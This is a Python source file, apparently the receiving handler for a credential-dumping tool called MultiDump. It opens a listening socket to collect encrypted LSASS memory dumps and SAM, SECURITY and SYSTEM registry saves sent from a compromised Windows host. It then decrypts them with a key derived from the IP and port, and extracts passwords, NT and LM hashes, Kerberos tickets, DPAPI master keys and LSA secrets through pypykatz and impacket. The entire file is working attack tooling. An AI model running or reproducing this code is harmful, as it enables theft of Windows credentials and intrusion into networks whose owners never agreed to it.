#!/usr/bin/env python3

import argparse
import binascii
import io
import logging
import os
import socket
import struct
from datetime import datetime

from impacket import version
from impacket.examples.secretsdump import LocalOperations, LSASecrets, SAMHashes
from pypykatz.pypykatz import pypykatz


class TerminalColor:
    HEADER = "\033[95m"
    OKBLUE = "\033[94m"
    OKGREEN = "\033[92m"
    WARNING = "\033[93m"
    FAIL = "\033[91m"
    ENDC = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"


class Credential:
    def __init__(
        self,
        username,
        password=None,
        domain=None,
        lmhash=None,
        nthash=None,
        sha1=None,
        ticket=None,
        ssp=None,
        masterkey=None,
    ):
        self.username = username
        self.password = password
        self.domain = domain
        self.lmhash = lmhash
        self.nthash = nthash
        self.sha1 = sha1
        self.ticket = ticket
        self.ssp = ssp
        self.masterkey = masterkey

    def __str__(self):
        attributes = [
            f"SSP: {self.ssp}",
            f"Domain: {self.domain}" if self.domain else "",
            f"Username: {self.username}" if self.username else "",
            f"Password: {self.password}" if self.password else "",
            f"LMHash: {self.lmhash}" if self.lmhash else "",
            f"NTHash: {self.nthash}" if self.nthash else "",
            f"SHA1: {self.sha1}" if self.sha1 else "",
            f"MasterKey: {self.masterkey}" if self.masterkey else "",
        ]
        return "\n".join(filter(None, attributes)) + "\n"


# From lsassy: https://github.com/Hackndo/lsassy
# https://github.com/Hackndo/lsassy/blob/f24b350c2d6277cbe64159cf3c7ee41fe9ef0de8/lsassy/parser.py#L16
def parse_dump(dump):
    credentials = []
    tickets = []
    masterkeys = []
    try:
        pypy_parse = pypykatz.parse_minidump_bytes(dump)
    except Exception as e:
        raise e

    ssps = [
        "msv_creds",
        "wdigest_creds",
        "ssp_creds",
        "livessp_creds",
        "kerberos_creds",
        "credman_creds",
        "tspkg_creds",
        "dpapi_creds",
    ]
    for luid in pypy_parse.logon_sessions:
        for ssp in ssps:
            for cred in getattr(pypy_parse.logon_sessions[luid], ssp, []):
                domain = getattr(cred, "domainname", None)
                username = getattr(cred, "username", None)
                password = getattr(cred, "password", None)
                LMHash = getattr(cred, "LMHash", None)
                NThash = getattr(cred, "NThash", None)
                SHA1 = getattr(cred, "SHAHash", None)
                if LMHash is not None:
                    LMHash = LMHash.hex()
                if NThash is not None:
                    NThash = NThash.hex()
                if SHA1 is not None:
                    SHA1 = SHA1.hex()
                if username and (
                    password
                    or (NThash and NThash != "00000000000000000000000000000000")
                    or (LMHash and LMHash != "00000000000000000000000000000000")
                ):
                    credentials.append(
                        Credential(
                            ssp=ssp,
                            domain=domain,
                            username=username,
                            password=password,
                            lmhash=LMHash,
                            nthash=NThash,
                            sha1=SHA1,
                        )
                    )

        for kcred in pypy_parse.logon_sessions[luid].kerberos_creds:
            for ticket in kcred.tickets:
                tickets.append(ticket)

        for dpapicred in pypy_parse.logon_sessions[luid].dpapi_creds:
            m = "{%s}:%s" % (dpapicred.key_guid, dpapicred.sha1_masterkey)
            if m not in masterkeys:
                masterkeys.append(m)
                credentials.append(
                    Credential(ssp="dpapi", domain="", username="", masterkey=m)
                )

    for cred in pypy_parse.orphaned_creds:
        if cred.credtype == "kerberos":
            for ticket in cred.tickets:
                tickets.append(ticket)

    for ticket in tickets:
        if ticket.ServiceName is not None and ticket.ServiceName[0] == "krbtgt":
            if ticket.EClientName is not None and ticket.DomainName is not None:
                if (
                    ticket.TargetDomainName is not None
                    and ticket.TargetDomainName != ticket.DomainName
                ):
                    target_domain = ticket.TargetDomainName
                else:
                    target_domain = ticket.DomainName
                # Keep only valid tickets
                if ticket.EndTime > datetime.now(ticket.EndTime.tzinfo):
                    credentials.append(
                        Credential(
                            ssp="kerberos",
                            domain=ticket.DomainName,
                            username=ticket.EClientName[0],
                            ticket={
                                "file": list(ticket.kirbi_data)[0].split(".kirbi")[0]
                                + "_"
                                + ticket.EndTime.strftime("%Y%m%d%H%M%S")
                                + ".kirbi",
                                "domain": target_domain,
                                "endtime": ticket.EndTime,
                            },
                        )
                    )

    return credentials, tickets, masterkeys


def parse_arguments():
    parser = argparse.ArgumentParser(description="Handler for RemoteProcDump")

    # Define arguments
    parser.add_argument(
        "-r", "--remote", type=int, help="Port to receive remote dump file"
    )
    parser.add_argument("-l", "--local", help="Local dump file, key needed to decrypt")
    parser.add_argument("--sam", help="Local SAM save, key needed to decrypt")
    parser.add_argument("--security", help="Local SECURITY save, key needed to decrypt")
    parser.add_argument("--system", help="Local SYSTEM save, key needed to decrypt")
    parser.add_argument("-k", "--key", help="Key to decrypt local file")
    parser.add_argument(
        "--override-ip",
        help="Manually specify the IP address for key generation in remote mode, for proxied connection",
        type=str,
    )

    args = parser.parse_args()

    # Check if either -r is set, -l is set, or all of --sam, --security, and --system are set
    local_group_required = [args.sam, args.security, args.system]
    if not any([args.remote, args.local]) and not all(local_group_required):
        parser.error(
            "Either -r/--remote, -l/--local, or all of --sam, --security, --system are required."
        )

    # Additional checks for -l/--local and --sam/--security/--system group usage
    if args.local and not args.key:
        parser.error("-k/--key is required when -l/--local is used.")
    if all(local_group_required) and not args.key:
        parser.error(
            "-k/--key is required when --sam, --security, and --system are specified."
        )

    return args


def read_file(filepath):
    with open(filepath, "rb") as file:
        return file.read()


def rc4_decrypt(key, data):
    # KSA
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]

    # PRGA
    i = j = 0
    result = bytearray()
    for char in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        result.append(char ^ S[(S[i] + S[j]) % 256])

    return bytes(result)


def mod_magic_bytes(data):
    if data[:6] == b"\x00\x00\x00\x00\x00\x00":
        replacement_bytes = bytes.fromhex("4D 44 4D 50 93 A7")
        modified_data = replacement_bytes + data[6:]
        return modified_data
    else:
        raise Exception()


def print_creds(credentials, tickets, masterkeys):
    print("\nCredentials:")
    for cred in credentials:
        print(cred)

    print("\nTickets:")
    for ticket in tickets:
        print(ticket)

    print("\nMasterkeys:")
    for key in masterkeys:
        print(key)


def write_file(filepath, data):
    with open(filepath, "wb") as file:
        file.write(data)
    print(f"{TerminalColor.OKGREEN}[i] Saved as {filepath}{TerminalColor.ENDC}")


def process_lsass_dump(raw_data, key):
    try:
        print(f"{TerminalColor.OKBLUE}[i] Decrypting dump data...{TerminalColor.ENDC}")
        decrypted_data = rc4_decrypt(key, raw_data)
    except Exception as e:
        return (
            raw_data,
            f"{TerminalColor.FAIL}[!] Error during decryption: {e}{TerminalColor.ENDC}",
        )

    try:
        print(f"{TerminalColor.OKBLUE}[i] Fixing magic bytes...{TerminalColor.ENDC}")
        lsass_dump = mod_magic_bytes(decrypted_data)
    except Exception as e:
        return (
            decrypted_data,
            f"{TerminalColor.FAIL}[!] The magic bytes are not zero! Probably wrong file/key used, or data lost during transfer.{TerminalColor.ENDC}",
        )

    try:
        print(f"{TerminalColor.OKBLUE}[i] Parsing dump file...{TerminalColor.ENDC}")
        credentials, tickets, masterkeys = parse_dump(lsass_dump)
    except Exception as e:
        return (
            lsass_dump,
            f"{TerminalColor.FAIL}[!] Error parsing lsass dump with pypykatz: {str(e)}{TerminalColor.ENDC}",
        )

    print_creds(credentials, tickets, masterkeys)
    return (
        lsass_dump,
        f"{TerminalColor.OKGREEN}\n[+] LSASS dump done!{TerminalColor.ENDC}",
    )


def dump_reg_secrets(sam_path, security_path, system_path):
    # Initialize LocalOperations with the SYSTEM hive for the boot key
    localOperations = LocalOperations(system_path)
    bootKey = localOperations.getBootKey()

    print(f"{TerminalColor.WARNING}[i] Dumping SAM hashes...{TerminalColor.ENDC}")
    samHashes = SAMHashes(sam_path, bootKey, isRemote=False)
    try:
        samHashes.dump()
    except Exception as e:
        print(f"{TerminalColor.FAIL}Failed to dump SAM hashes: {e}{TerminalColor.ENDC}")

    print(f"{TerminalColor.WARNING}[i] Dumping LSA Secrets...{TerminalColor.ENDC}")
    try:
        lsaSecrets = LSASecrets(security_path, bootKey, isRemote=False)
        lsaSecrets.dumpCachedHashes()
        lsaSecrets.dumpSecrets()
    except Exception as e:
        print(
            f"{TerminalColor.FAIL}Failed to dump LSA Secrets: {e}{TerminalColor.ENDC}"
        )


def process_reg_dumps(sam, security, system, key_hex):
    print(f"{TerminalColor.OKBLUE}[i] Decrypting registry saves...{TerminalColor.ENDC}")

    decrypted_filenames = {
        "sam": "sam.save",
        "security": "security.save",
        "system": "system.save",
    }

    def decrypt_and_save(input_var, key_hex, output_filename):
        data = (
            input_var if isinstance(input_var, bytes) else open(input_var, "rb").read()
        )
        decrypted_data = rc4_decrypt(key_hex, data)
        with open(output_filename, "wb") as decrypted_file:
            decrypted_file.write(decrypted_data)

    decrypt_and_save(sam, key_hex, decrypted_filenames["sam"])
    decrypt_and_save(security, key_hex, decrypted_filenames["security"])
    decrypt_and_save(system, key_hex, decrypted_filenames["system"])

    dump_reg_secrets(
        decrypted_filenames["sam"],
        decrypted_filenames["security"],
        decrypted_filenames["system"],
    )

    response = input("Save the processed registry dump files? [Y/n] ").lower()
    if response == "n":
        for filename in decrypted_filenames.values():
            os.remove(filename)
            print(
                f"{TerminalColor.WARNING}[i] {filename} has been deleted.{TerminalColor.ENDC}"
            )
    else:
        print(
            f"{TerminalColor.OKGREEN}[i] All files have been saved.{TerminalColor.ENDC}"
        )


def generate_key(ip, port):
    ip_numeric = struct.unpack("!L", socket.inet_aton(ip))[0]
    key = (ip_numeric << 16) | int(port)
    print(
        f"{TerminalColor.OKBLUE}[i] Using {key} to decrypt key...{TerminalColor.ENDC}"
    )
    key_bytes = key.to_bytes(8, "little")
    return key_bytes


def start_server(port, type, threshold_kb):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind(("0.0.0.0", port))
    server_socket.listen(1)
    print(f"[i] Listening on port {port} for {type}...")

    client_socket, (client_ip, client_port) = server_socket.accept()
    local_ip = client_socket.getsockname()[0]
    print(
        f"{TerminalColor.OKGREEN}[+] Connection established from {client_ip}:{client_port}{TerminalColor.ENDC}\n"
    )

    total_bytes_received = 0
    received_data = b""
    next_status_threshold = 10 * 1024 * 1024  # 10 MB
    threshold_bytes = threshold_kb * 1024  # Convert KB threshold to bytes

    while True:
        chunk = client_socket.recv(1048576)  # 1 MB
        if not chunk:
            break
        received_data += chunk
        total_bytes_received += len(chunk)

        # Check if received bytes exceed the threshold
        if total_bytes_received > threshold_bytes:
            print(
                f"{TerminalColor.FAIL}[!] Data limit exceeded. Terminating connection.{TerminalColor.ENDC}"
            )
            exit(1)

        if total_bytes_received >= next_status_threshold:
            print(
                f"{TerminalColor.WARNING}[i] Received {total_bytes_received / (1024 * 1024):.2f} MB...{TerminalColor.ENDC}"
            )
            next_status_threshold += 10 * 1024 * 1024

    client_socket.close()
    server_socket.close()

    print(
        f"{TerminalColor.OKGREEN}[+] Received {total_bytes_received / (1024 * 1024):.2f} MB{TerminalColor.ENDC}\n"
    )
    return received_data, local_ip


def handle_remote_dump(args):
    lsass_data = None
    sam_save = None
    security_save = None
    system_save = None
    lsass_dump = False
    reg_dump = False

    try:
        typed_rc4_key, local_ip = start_server(args.remote, "encrypted key", 1)

        if len(typed_rc4_key) != 65:
            print(f"{TerminalColor.FAIL}[!] Key size mismatch!{TerminalColor.ENDC}")
            return  # Return early since the key size is incorrect

        if typed_rc4_key[0] == 0:
            lsass_dump = True
            reg_dump = True
        elif typed_rc4_key[0] == 1:
            lsass_dump = True
        elif typed_rc4_key[0] == 2:
            reg_dump = True

        enc_rc4_key = typed_rc4_key[1:65]

        if reg_dump:
            sam_save, local_ip = start_server(args.remote, "encrypted SAM save", 10240)

            security_save, local_ip = start_server(
                args.remote, "encrypted SECURITY save", 10240
            )

            system_save, local_ip = start_server(
                args.remote, "encrypted SYSTEM save", 51200
            )

        if lsass_dump:
            lsass_data, local_ip = start_server(
                args.remote, "encrypted LSASS dump", 512000
            )

        # Handle IP override or confirmation
        if args.override_ip:
            rc4_key_key = generate_key(args.override_ip, args.remote)
        else:
            response = input(
                f"Detected IP: {local_ip}, does this match the IP used by MultiDump? [Y/n] "
            ).lower()
            if response == "n":
                local_ip = input("Enter an IP: ")
            rc4_key_key = generate_key(local_ip, args.remote)

        # Attempt decryption
        rc4_key = rc4_decrypt(rc4_key_key, enc_rc4_key)
        print(
            f"{TerminalColor.OKBLUE}[i] Decrypted key: {binascii.hexlify(rc4_key).decode()}{TerminalColor.ENDC}\n"
        )

        if reg_dump:
            if sam_save != None and security_save != None and system_save != None:
                process_reg_dumps(sam_save, security_save, system_save, rc4_key)

        if lsass_dump:
            lsass_data, message = process_lsass_dump(lsass_data, rc4_key)
            print(message)

    except Exception as e:
        print(f"{TerminalColor.FAIL}[!] Error: {e}{TerminalColor.ENDC}")
    finally:
        # Ensure write_file is called even if there's an error
        if lsass_data:
            response = input("Save the processed files? [Y/n] ").lower()
            if response != "n":
                write_file("lsass.dmp", lsass_data)


def main():
    args = parse_arguments()

    if args.local and args.key:
        try:
            key = bytes.fromhex(args.key)
        except ValueError as e:
            print(
                f"{TerminalColor.FAIL}[!] Error converting key: {e}{TerminalColor.ENDC}"
            )
            exit()

        enc_dump = read_file(args.local)

        dump_data, message = process_lsass_dump(enc_dump, key)
        print(message)

        if dump_data:
            response = input("Save the processed LSASS dump file? [Y/n] ").lower()
            if response != "n":
                write_file("lsass.dmp", dump_data)

    if args.sam and args.security and args.system and args.key:
        try:
            key = bytes.fromhex(args.key)
        except ValueError as e:
            print(
                f"{TerminalColor.FAIL}[!] Error converting key: {e}{TerminalColor.ENDC}"
            )
            exit()
        process_reg_dumps(args.sam, args.security, args.system, key)

    elif args.remote:
        handle_remote_dump(args)


if __name__ == "__main__":
    main()
